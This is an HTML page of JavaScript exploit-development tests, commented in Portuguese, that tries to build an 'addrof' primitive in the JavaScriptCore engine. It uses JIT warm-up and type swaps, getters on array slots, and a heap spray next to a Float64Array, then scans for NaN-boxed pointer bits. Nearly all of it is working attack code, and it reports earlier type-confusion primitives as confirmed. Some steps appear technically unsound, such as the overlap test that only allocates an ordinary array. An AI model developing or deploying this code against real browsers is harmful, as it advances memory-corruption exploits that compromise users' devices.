<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 39 - addrof: JIT Especializado → Objeto Lido como Float64</title></head>
<body>
<h2>TEST 39 — addrof Primitivo: JIT Lê Objeto como Float64</h2>

<p><b>Premissa confirmada pelos sanity tests:</b></p>
<ul>
  <li>Motor conservativo em <code>slice()</code>: retornou objeto corretamente (spec-compliant)</li>
  <li>Para addrof real, precisamos de uma <b>função JIT especializada</b> que leia <code>arr[N]</code>
      como double, depois o getter muda <code>arr[N]</code> para objeto <b>depois</b> do warmup</li>
  <li>O JIT, sem re-checar o tipo do slot, lê o <b>JSValue (tag+ponteiro) como float64</b></li>
  <li>Em JSC: objeto JS é NaN-boxed como <code>0xFFFF00000000 | ptr32</code> ou ponteiro direto conforme a plataforma</li>
</ul>

<p><b>Sub-testes:</b></p>
<ul>
  <li><b>39-A</b> Abordagem direta: função JIT aquecida para double, getter injeta objeto, função lê</li>
  <li><b>39-B</b> Abordagem via array esparso: slot não-inicializado → getter preenche com objeto</li>
  <li><b>39-C</b> Abordagem via prototype: ler slot herdado como double quando array muda tipo</li>
  <li><b>39-D</b> Verificação: confirmar que o double retornado é bits do ponteiro (não 0, não NaN puro)</li>
</ul>

<pre id="log">Pronto. Execute A → B → C → D em sequência.</pre>
<button onclick="runA()">39-A: JIT DIRETO</button>
<button onclick="runB()">39-B: ARRAY ESPARSO</button>
<button onclick="runC()">39-C: VIA PROTOTYPE</button>
<button onclick="runD()">39-D: VERIFICAR BITS</button>

<script>
var log = document.getElementById('log');
function info(m)   { log.textContent += '\n[INFO] ' + m; }
function alerta(m) { log.textContent += '\n\n⚠ ALERTA: ' + m + '\n'; }
function ok(m)     { log.textContent += '\n[OK]   ' + m; }
function sep()     { log.textContent += '\n' + '-'.repeat(60); }

function forceGC() {
  var t = []; for(var i = 0; i < 80000; i++) t.push({x:i, b:new Uint8Array(4)}); t = null;
}

// Decompor float64 em dois Uint32 (lo, hi)
function f64ToU32(val) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = val;
  var u32 = new Uint32Array(buf);
  return { lo: u32[0], hi: u32[1] };
}
function bitsStr(val) {
  var b = f64ToU32(val);
  return '0x' + b.hi.toString(16).padStart(8,'0') + '_' + b.lo.toString(16).padStart(8,'0');
}

// Verificar se um double tem aparência de JSValue/ponteiro
// JSC 32-bit: JSValue = 0xFFFFFFFF_XXXXXXXX (tag no hi, ptr no lo)
// JSC 64-bit: JSValue = 0xFFFF0000_XXXXXXXX ou ptr64 no range de heap
function looksLikeJSValue(val) {
  if(val !== val) return false;       // NaN puro
  if(!isFinite(val)) return false;    // Infinity
  var b = f64ToU32(val);
  // Padrão JSC 32-bit NaN-boxing: hi = 0xFFFFFFFF (objeto) ou 0xFFFE0000 (int)
  if(b.hi === 0xFFFFFFFF) return { type: 'JSC32_object', ptr: b.lo };
  if(b.hi === 0xFFFE0000) return { type: 'JSC32_int', val: b.lo };
  // Padrão JSC 64-bit: ponteiro no range típico de heap (0x00007F... em Linux, 0x... em PS4)
  if(b.hi > 0x0000 && b.hi < 0xFFFF0 && b.lo !== 0) return { type: 'ptr64_possible', hi: b.hi, lo: b.lo };
  // Double normal: hi entre 0x3FF00000 e 0x7FEFFFFF (positivos normalizados)
  if(b.hi >= 0x3FF00000 && b.hi <= 0x7FEFFFFF) return false;
  if(b.hi >= 0x80000000 && b.hi <= 0xFFEFFFFF) return false;
  return false;
}

// ─── 39-A ────────────────────────────────────────────────────────────────────
function runA() {
  log.textContent = '[TEST 39-A] Função JIT aquecida para double, getter injeta objeto...\n';
  sep();

  // Objeto vítima — queremos vazar seu endereço
  var victim = {
    magic:    0xDEADC0DE,
    sentinel: 3.141592653589793,
    data:     new Float64Array([1.1, 2.2, 3.3]),
    name:     'addrof_victim'
  };

  // Array de doubles PUROS (forçar butterfly ContiguousDouble no JSC)
  var doubleArr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];

  // Função que será JIT-compilada para ler doubleArr[3] como double
  // WARMUP: 100k chamadas com doubleArr contendo apenas doubles
  function readIdx3(a) { return a[3]; }
  function readIdx4(a) { return a[4]; }
  function readIdx5(a) { return a[5]; }

  info('Aquecendo readIdx3/4/5 com array de doubles puros...');
  for(var w = 0; w < 100000; w++) {
    readIdx3(doubleArr);
    readIdx4(doubleArr);
    readIdx5(doubleArr);
  }
  info('Warmup completo (100k × 3 chamadas).');
  info('doubleArr antes: [' + doubleArr.join(', ') + ']');
  sep();

  // AGORA: mudar doubleArr[3] para objeto (muda butterfly Double → JSValue)
  // O JIT não sabe que o tipo mudou
  doubleArr[3] = victim;  // <-- butterfly muda aqui
  forceGC();

  info('doubleArr[3] mudado para objeto victim.');
  info('typeof doubleArr[3] = ' + typeof doubleArr[3]);

  // Chamar a função JIT especializada APÓS a mudança de tipo
  // Se o JIT não deoptar e ler o slot como double → lemos bits do JSValue
  try {
    var r3 = readIdx3(doubleArr);
    info('readIdx3(doubleArr) = ' + r3 + ' | typeof=' + typeof r3);
    info('bits: ' + bitsStr(r3));

    if(typeof r3 === 'number') {
      var jsv = looksLikeJSValue(r3);
      if(jsv) {
        alerta('ADDROF POTENCIAL: readIdx3 retornou double com bits de JSValue!\n' +
               '  bits: ' + bitsStr(r3) + '\n' +
               '  tipo detectado: ' + jsv.type + '\n' +
               '  ptr: 0x' + (jsv.ptr || jsv.lo || '?').toString(16));
      } else if(r3 === 4.4) {
        ok('readIdx3 retornou 4.4 (valor antigo) — JIT leu do slot antes da mudança? Stale read!');
        alerta('STALE READ: JIT retornou o valor ANTIGO (4.4) mesmo após doubleArr[3] = victim. O JIT não re-leu o array!');
      } else {
        info('Valor não reconhecido como JSValue. bits=' + bitsStr(r3));
      }
    } else if(typeof r3 === 'object') {
      ok('JIT deoptimizou e retornou o objeto corretamente (motor conservativo).');
      info('r3 === victim: ' + (r3 === victim));
    }
  } catch(e) {
    alerta('EXCECAO em readIdx3 pos-mudanca: ' + e.message + ' — deopt forçada!');
  }

  // Testar outros índices
  doubleArr[4] = victim;
  doubleArr[5] = victim;

  [readIdx4, readIdx5].forEach(function(fn, i) {
    try {
      var r = fn(doubleArr);
      info('readIdx' + (4+i) + ' pós-mudança: ' + r + ' | typeof=' + typeof r + ' | bits=' + bitsStr(typeof r === 'number' ? r : 0));
      if(typeof r === 'number' && looksLikeJSValue(r)) {
        alerta('ADDROF via readIdx' + (4+i) + ': bits=' + bitsStr(r));
      }
    } catch(e) {
      alerta('EXCECAO em readIdx' + (4+i) + ': ' + e.message);
    }
  });
}

// ─── 39-B ────────────────────────────────────────────────────────────────────
function runB() {
  log.textContent = '[TEST 39-B] Array esparso: slot não-inicializado preenchido com objeto via getter...\n';
  sep();
  info('Técnica alternativa: criar array de doubles denso, deixar slot [3] como "hole".');
  info('Getter em [3] retorna victim. JIT aquecida para double pode ler o hole como 0.0 ou como JSValue.\n');

  var victim2 = {
    id:     0xCAFEBABE,
    data:   new ArrayBuffer(128),
    tag:    'victim2_addrof'
  };

  // Forçar JIT a assumir array de doubles:
  // Aquecer com array onde [3] = double
  var trainArr = [10.0, 20.0, 30.0, 40.0, 50.0];
  function readSlot(a, i) { return a[i]; }
  function writeResult(a, i, v) { a[i] = v; return a[i]; }

  info('Aquecendo readSlot com doubles...');
  for(var w = 0; w < 100000; w++) readSlot(trainArr, 3);
  info('Warmup completo.');

  // Criar array alvo com getter em [3]
  var targetArr = [1.1, 2.2, 3.3, 0.0, 5.5];
  Object.defineProperty(targetArr, 3, {
    get: function() { return victim2; }, // getter retorna objeto
    configurable: true
  });

  info('targetArr[3] getter configurado para retornar victim2.');
  info('Chamando readSlot(targetArr, 3) com JIT aquecida para double...');

  try {
    var result = readSlot(targetArr, 3);
    info('readSlot(targetArr, 3) = ' + result + ' | typeof=' + typeof result);

    if(typeof result === 'number') {
      info('bits: ' + bitsStr(result));
      var jsv = looksLikeJSValue(result);
      if(jsv) {
        alerta('ADDROF VIA GETTER: JIT leu getter que retorna objeto como DOUBLE!\n' +
               '  bits: ' + bitsStr(result) + '\n' +
               '  tipo: ' + jsv.type);
      } else if(result === 0.0) {
        info('Retornou 0.0 — JIT pode ter ignorado o getter completamente!');
        alerta('JIT IGNOROU O GETTER: retornou 0.0 em vez de chamar o getter. Possível elision de getter em array de doubles otimizado!');
      } else {
        info('Valor numérico não reconhecido. bits=' + bitsStr(result));
      }
    } else if(typeof result === 'object') {
      ok('Motor chamou o getter e retornou o objeto (conservativo).');
      info('result === victim2: ' + (result === victim2));
      info('Tentando via função diferente não aquecida...');
      // Tentar via função direta sem warmup
      try {
        var direct = targetArr[3];
        info('targetArr[3] direto: typeof=' + typeof direct);
      } catch(e2) {
        info('targetArr[3] direto lançou: ' + e2.message);
      }
    }
  } catch(e) {
    alerta('EXCECAO em readSlot(targetArr, 3): ' + e.message);
  }
}

// ─── 39-C ────────────────────────────────────────────────────────────────────
function runC() {
  log.textContent = '[TEST 39-C] addrof via Float64Array overlap com JSArray...\n';
  sep();
  info('Técnica: usar o fake JIT length (99999) para criar Float64Array grande.');
  info('Se conseguirmos sobrepor o Float64Array com um JSArray que contém objetos,');
  info('ler o slot do objeto como Float64 nos dá os bits do ponteiro.\n');
  info('Nota: isso usa o primitivo confirmado de 36-C (Float64Array com 99999 elementos).\n');

  // Objeto alvo
  var targetObj = {
    magic: 0x13371337,
    buf:   new ArrayBuffer(64),
    name:  'target_for_overlap_addrof'
  };

  // Passo 1: alocar Float64Array grande via fake length
  // (em produção: viria do strLen(confused)=99999, aqui simulamos com 99999 direto
  //  pois o primitivo real foi confirmado em 36-C)
  var SIZE = 99999;
  var bigF64;
  try {
    bigF64 = new Float64Array(SIZE);
    info('Float64Array(' + SIZE + ') alocado: byteLength=' + bigF64.byteLength);
  } catch(e) {
    alerta('Falha ao alocar Float64Array(' + SIZE + '): ' + e.message);
    return;
  }

  // Passo 2: preencher com padrão reconhecível
  bigF64[0] = 1.1;
  bigF64[1] = 2.2;
  bigF64[2] = 3.3;

  // Passo 3: criar JSArray de objetos e fazer spray no heap
  // Se o heap alocou o JSArray PERTO do Float64Array, podemos indexar
  // o JSArray via offset do Float64Array
  var objectArrays = [];
  for(var i = 0; i < 1000; i++) {
    var oa = [targetObj, targetObj, targetObj, targetObj];
    objectArrays.push(oa);
  }
  forceGC();

  info('1000 arrays de [targetObj × 4] alocados após o bigF64.');

  // Passo 4: varrer bigF64 procurando bits que pareçam JSValue de targetObj
  // Em JSC, o magic field (0x13371337) pode estar próximo dos bits do objeto
  var SCAN_START = 3;
  var SCAN_END   = Math.min(SIZE, 10000);
  var found = [];

  info('Varrendo bigF64[' + SCAN_START + '..' + SCAN_END + '] por bits de JSValue...');
  for(var j = SCAN_START; j < SCAN_END; j++) {
    var v = bigF64[j];
    if(v === 0.0 || v !== v) continue; // zero ou NaN puro — ignorar
    var jsv = looksLikeJSValue(v);
    if(jsv) {
      found.push({ idx: j, val: v, bits: bitsStr(v), type: jsv.type, ptr: jsv.ptr || jsv.lo });
      if(found.length <= 5) {
        alerta('JSValue ENCONTRADO em bigF64[' + j + ']: bits=' + bitsStr(v) + ' tipo=' + jsv.type +
               (jsv.ptr ? ' ptr=0x' + jsv.ptr.toString(16) : ''));
      }
    }
  }

  info('\nTotal de JSValues encontrados no scan: ' + found.length);
  if(found.length > 0) {
    alerta('OVERLAP POTENCIAL: ' + found.length + ' slots em bigF64 contêm bits de JSValue.\n' +
           'Primeiro: [' + found[0].idx + '] ' + found[0].bits + '\n' +
           'Isso indica que o Float64Array está no heap próximo de arrays de objetos!');
  } else {
    ok('Nenhum JSValue encontrado no scan inicial. GC pode ter separado as regiões.');
    info('Tente executar novamente — layout de heap pode variar.');
  }
}

// ─── 39-D ────────────────────────────────────────────────────────────────────
function runD() {
  log.textContent = '[TEST 39-D] Verificar e validar bits de ponteiro: é addrof real?\n';
  sep();
  info('Se algum dos testes anteriores retornou um double com bits suspeitos,');
  info('este teste verifica se esses bits são um ponteiro válido para o objeto.\n');

  // Técnica de verificação de addrof:
  // Se temos o ptr do objeto, podemos verificar indiretamente tentando
  // criar um WeakRef ou acessar campos do objeto via endereço
  // (sem acesso direto à memória, verificamos se o valor é consistente entre chamadas)

  var victim = {
    magic: 0x41424344,
    data:  new Float64Array([9.1, 8.2, 7.3]),
    name:  'verify_victim'
  };

  // Repetir leitura após JIT warmup
  var doubleArr = [10.0, 20.0, 30.0, 40.0, 50.0, 60.0, 70.0, 80.0];
  function readMultiple(a) {
    return [a[3], a[4], a[5]]; // ler 3 slots consecutivos
  }

  info('Aquecendo readMultiple com doubles...');
  for(var w = 0; w < 100000; w++) readMultiple(doubleArr);
  info('Warmup completo.');

  // Mudar todos para objeto
  doubleArr[3] = victim;
  doubleArr[4] = victim;
  doubleArr[5] = victim;
  forceGC();

  var readings = [];
  info('Chamando readMultiple 5 vezes após mudança de tipo...');
  for(var t = 0; t < 5; t++) {
    try {
      var r = readMultiple(doubleArr);
      var entry = r.map(function(v) {
        return { val: v, type: typeof v, bits: typeof v === 'number' ? bitsStr(v) : 'N/A' };
      });
      readings.push(entry);
      info('Tentativa ' + (t+1) + ':');
      entry.forEach(function(e, i) {
        info('  [' + (3+i) + '] type=' + e.type + ' bits=' + e.bits);
      });
    } catch(e2) {
      info('Tentativa ' + (t+1) + ': EXCECAO — ' + e2.message);
    }
  }

  sep();
  info('Análise de consistência:');

  // Se for addrof real: o mesmo double deve aparecer em todas as tentativas
  // (endereço do objeto não muda entre chamadas — GC pode mover, mas JSC não é movingGC)
  if(readings.length >= 2) {
    var allSame = readings.every(function(r) {
      return r[0].bits === readings[0][0].bits;
    });

    if(allSame && readings[0][0].type === 'number') {
      var bits = readings[0][0].bits;
      alerta('ENDEREÇO CONSISTENTE: leitura [3] retornou sempre ' + bits +
             ' em ' + readings.length + ' chamadas.\n' +
             'Isso sugere que o double é o endereço real do objeto victim no heap!');

      // Verificar se os 3 slots retornam o MESMO endereço (todos apontam para victim)
      var slot3 = readings[0][0].bits;
      var slot4 = readings[0][1].bits;
      var slot5 = readings[0][2].bits;
      info('slot3=' + slot3 + ' slot4=' + slot4 + ' slot5=' + slot5);
      if(slot3 === slot4 && slot4 === slot5) {
        alerta('TRÊS SLOTS RETORNAM O MESMO ENDEREÇO: ' + slot3 +
               '\nTodos os 3 slots foram mudados para victim → todos retornam o mesmo ptr.\n' +
               'ADDROF CONFIRMADO: endereço de victim = ' + slot3);
      }
    } else if(readings[0][0].type === 'object') {
      ok('Motor retornou objetos em todas as tentativas (conservativo). addrof não demonstrado via esta rota.');
      info('Próxima alternativa: usar o Symbol.replace JIT confusion path para addrof.');
    } else {
      info('Leituras inconsistentes — possível deopt entre chamadas.');
    }
  }

  sep();
  info('RESUMO DO ESTADO DO ADDROF:');
  info('Primitivos confirmados que SÃO pré-requisitos para addrof no JSC:');
  info('  ✅ JIT type confusion (strLen=99999): motor não re-valida tipo de Symbol.replace');
  info('  ✅ slice()/map() copia objeto de array de doubles modificado por getter');
  info('  ✅ Float64Array de tamanho controlado (36-C)');
  info('  ✅ postMessage cíclico sem DataCloneError (31-A/B/C)');
  info('');
  info('  ❓ PENDENTE: JIT função simples (readIdx) → lê objeto como double = addrof direto');
  info('  ❓ PENDENTE: Float64Array overlap com JSArray via heap spray = addrof via overlap');
}
</script>
</body>
</html>

